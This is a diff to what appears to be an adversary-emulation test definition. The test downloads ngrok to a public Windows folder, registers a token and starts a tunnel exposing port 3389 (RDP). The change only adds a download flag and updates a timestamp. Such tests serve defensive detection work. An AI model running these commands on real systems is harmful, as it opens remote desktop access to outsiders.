@@ -11,8 +11,8 @@
         command: 'if (Test-Path C:\Users\Public\ngrok) {exit 0} else {exit 1}; then
           : ; else New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null;
           Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
-          -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip; Expand-Archive
-          C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath
+          -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -UseBasicParsing;
+          Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath
           C:\Users\Public\ngrok; fi; C:\Users\Public\ngrok\ngrok.exe config add-authtoken
           N/A | Out-Null; Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe
           tcp 3389 } | Out-Null; Start-Sleep -s 5; Stop-Job -Name Job1 | Out-Null'
@@ -54,6 +54,7 @@
         | Out-Null
 
         Invoke-WebRequest #{download} -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
+        -UseBasicParsing
 
         Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath
         C:\Users\Public\ngrok
@@ -61,4 +62,4 @@
         '
     technique_created: '2020-03-15T16:03:39.082Z'
     atomic_guid: 4cdc9fc7-53fb-4894-9f0c-64836943ea60
-    import_timestamp: '2026-10-20T07:08:29.166958Z'
+    import_timestamp: '2026-10-21T07:01:51.229542Z'
